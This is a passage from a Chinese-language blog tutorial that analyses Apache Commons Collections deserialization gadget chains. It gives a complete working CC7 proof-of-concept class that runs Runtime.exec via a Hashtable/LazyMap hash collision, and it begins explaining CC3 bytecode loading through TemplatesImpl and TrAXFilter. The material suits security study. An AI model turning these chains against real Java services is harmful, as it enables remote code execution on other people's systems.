h;<br>&gt;&#125;<br></code></pre></td></tr></table></figure></blockquote><p>所以构造两个 LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">iner1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><span class="hljs-type">Map</span> <span class="hljs-variable">iner2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">outer1</span> <span class="hljs-operator">=</span> LazyMap.decorate(iner1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">Map</span> <span class="hljs-variable">outer2</span> <span class="hljs-operator">=</span> LazyMap.decorate(iner2,chainedTransformer);<br><br><br>outer1.put(<span class="hljs-string">&quot;yy&quot;</span>,<span class="hljs-number">1</span>);<br>outer2.put(<span class="hljs-string">&quot;zZ&quot;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>再将两个Map放入 Hashtable中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br><br>unser.put(outer1,<span class="hljs-number">1</span>);<br>unser.put(outer2,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>老规矩，put也会触发equals方法所以先使用假的transform，再使用反射替换成有效的，并把多余的条目从outer2 LazyMap中移除。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">tools.setValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>outer2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException &#123;<br>        Transformer[] fake = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">2</span>)<span class="hljs-comment">//这里注意不能和put进LazyMap的值一样，否则由于Hashtable的检测将无法成功把outer2添加到Hashtable中</span><br>        &#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fake);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">iner1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">iner2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outer1</span> <span class="hljs-operator">=</span> LazyMap.decorate(iner1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outer2</span> <span class="hljs-operator">=</span> LazyMap.decorate(iner2,chainedTransformer);<br><br><br>        outer1.put(<span class="hljs-string">&quot;yy&quot;</span>,<span class="hljs-number">1</span>);<br>        outer2.put(<span class="hljs-string">&quot;zZ&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br><br>        unser.put(outer1,<span class="hljs-number">1</span>);<br>        unser.put(outer2,<span class="hljs-number">1</span>);<br><br>        tools.setValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,transformers);<br>        outer2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC7.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(unser);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC7.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这条链可以看看调试记录</p><p>先来到 Hashtable的readObject方法里</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730204424784.png" alt="image-20220730204424784"></p><p>可以看到这是我们添加的一个LazyMap。跟进到<code>reconstitutionPut</code>内部其会计算key的Hashcode，而LazyMap会直接调用修饰的Map的hashCode方法所以直接去HashMap.hashCode方法。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730205132294.png" alt="image-20220730205132294"></p><p>可以看到计算hashCode的方法是key、value分别计算hashCode再异或。value可以设置相同，所以只需要将key碰撞，最后得到的hash就相同。</p><p>再回到<code>reconstitutionPut</code>，此时的tab为空所以直接将这对key-value放入tab中。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730205426132.png" alt="image-20220730205426132"></p><p>单步调试再次进入<code>reconstitutionPut</code>函数，这是key就是恶意的LazyMap了。</p><p>再次计算hashCode成功进入equals分支</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730205730816.png" alt="image-20220730205730816"></p><blockquote><p>Java条件判断中使用 &amp;&amp; 时，会先判断前一个表达式，如果为false就不会执行后一个表达式</p></blockquote><p>来到<code>AbstractMap.equals()</code>方法看到其中的m正式我们构造的LazyMap。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730210419739.png" alt="image-20220730210419739"></p><p>再get处成功弹出计算器。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730210517040.png" alt="image-20220730210517040"></p><p>利用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashTable</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashTable</span>.</span></span>reconstitution<span class="hljs-constructor">Put()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractMapDecorator</span>.</span></span>equals<span class="hljs-literal">()</span><br>       <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractMap</span>.</span></span>equals<span class="hljs-literal">()</span><br>         <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>再CC链反序列化出现之后，响应的防护产品必然会应运而生，其中就有一个叫做SerialKiller的反序列化过滤器工具。而它的最初规则定义是这样的</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730212620687.png" alt="image-20220730212620687"></p><p>限制了InvokerTransformer的使用。</p><p>所以CC3就出现了，这条链的长处就是可以不使用InvokerTransformer就可以执行命令。</p><blockquote><p>这不是一个链单独的长度之前几个链都可以经过简单的改造完成不用InvokerTransformer就可以执行命令。</p></blockquote><h3 id="Java动态加载字节码"><a href="#Java动态加载字节码" class="headerlink" title="Java动态加载字节码"></a>Java动态加载字节码</h3><p>不使用InvokerTransformer完成命令执行的方式是采用Java动态加载字节码的功能，只需要将执行命令卸载加载的字节码的构造函数或者静态代码块中就可任意执行。</p><blockquote><p>注意在加载字节码的时候，类并没有进行初始化，所以实际上触发任意执行的是加载字节码之后对其进行实例化的操作</p></blockquote><h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><blockquote><p>在Java中尝试加载一个类一般有三个步骤</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730221020292.png" alt="image-20220730221020292"></p><ul><li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass </li><li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </li><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li><li><strong>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</strong> 这一步就是目前主要关心的。</li></ul></blockquote><p>defineClass方法是不开放的，所以在攻击的时候并不能直接地去调用这个方法。</p><p>不过在Java的底层是由一些类使用了这个方法，CC3三中用到的就是<code>TemplatesImpl</code></p><blockquote><p>值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Templates</span>, Serializable &#123;<br>...<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransletClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123;<br>        TransletClassLoader(ClassLoader parent) &#123;<br>            <span class="hljs-built_in">super</span>(parent);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Access to final protected superclass member from outer class.</span><br><span class="hljs-comment">         */</span><br>        Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>            <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>        &#125;<br>    &#125;<br>...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title function_">newTransformer</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException<br>    &#123;<br>        TransformerImpl transformer;<br><br>        transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,<br>            _indentNumber, _tfactory);<br><br>        <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-literal">null</span>) &#123;<br>            transformer.setURIResolver(_uriResolver);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>            transformer.setSecureProcessing(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> transformer;<br>    &#125;<br>...<br><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br><br>            <span class="hljs-comment">// The translet needs to keep a reference to all its auxiliary</span><br>            <span class="hljs-comment">// class to prevent the GC from collecting them</span><br>            <span class="hljs-type">AbstractTranslet</span> <span class="hljs-variable">translet</span> <span class="hljs-operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();<br>            translet.postInitialization();<br>            translet.setTemplates(<span class="hljs-built_in">this</span>);<br>            translet.setServicesMechnism(_useServicesMechanism);<br>            translet.setAllowedProtocols(_accessExternalStylesheet);<br>            <span class="hljs-keyword">if</span> (_auxClasses != <span class="hljs-literal">null</span>) &#123;<br>                translet.setAuxiliaryClasses(_auxClasses);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> translet;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (InstantiationException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br> ...<br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br><br>        <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>            AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());<br>                &#125;<br>            &#125;);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">classCount</span> <span class="hljs-operator">=</span> _bytecodes.length;<br>            _class = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[classCount];<br><br>            <span class="hljs-keyword">if</span> (classCount &gt; <span class="hljs-number">1</span>) &#123;<br>                _auxClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br>                <span class="hljs-keyword">final</span> <span class="hljs-type">Class</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> _class[i].getSuperclass();<br><br>                <span class="hljs-comment">// Check if this is the main class</span><br>                <span class="hljs-keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;<br>                    _transletIndex = i;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    _auxClasses.put(_class[i].getName(), _class[i]);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (_transletIndex &lt; <span class="hljs-number">0</span>) &#123;<br>                ErrorMsg err= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (LinkageError e) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>TemplatesImpl</code>中定义了一个内部类<code>TransletClassLoader</code>，这个内部类里就有defineClass方法。</p><p>回溯一下调用栈可以找到一个public的<code>newTransformer</code>方法可以层层调用到内部类<code>TransletClassLoader</code>的defineClass方法，并且在加载字节码之后还自主实例化了，整个调用过程如下</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Transformer</span><br>getTransletInstance<br>defineTransletClasses<br>defineClass<br>Class.<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span><br></code></pre></td></tr></table></figure><p>再来关注一下defineClass加载的字节码是来自于何处</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">_class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure><p>来自于内部属性<code> byte[][] _bytecodes</code></p><p>所以要使用反射设置此属性为需要加载的字节码。</p><p>还有在调用路径上会检查<code>_name</code>属性，此属性不为空才能正常加载字节码</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730230629098.png" alt="image-20220730230629098"></p><p>所以要整个加载字节码的代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><span class="hljs-type">byte</span>[]  code = readFile(<span class="hljs-string">&quot;./target/classes/Calc.class&quot;</span>);<br>tools.setValue(obj,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>tools.setValue(obj,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>);<br>obj.newTransformer();<br></code></pre></td></tr></table></figure><h3 id="POC构造-4"><a href="#POC构造-4" class="headerlink" title="POC构造"></a>POC构造</h3><p>上面知道了如何构造一个动态加载字节码的demo，但是在实际的反序列化中还需要链去调用newTransformer函数，CC3使用的是<code>TrAXFilter</code>和<code>InstantiateTransformer</code>搭配的方式。</p><h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>这个类的构造方法里调用了newTransformer函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TrAXFilter</span><span class="hljs-params">(Templates templates)</span>  <span class="hljs-keyword">throws</span><br>        TransformerConfigurationException<br>    &#123;<br>        _templates = templates;<br>        _transformer = (TransformerImpl) templates.newTransformer();<span class="hljs-comment">//此处调用了newTransformer</span><br>        _transformerHandler = <span 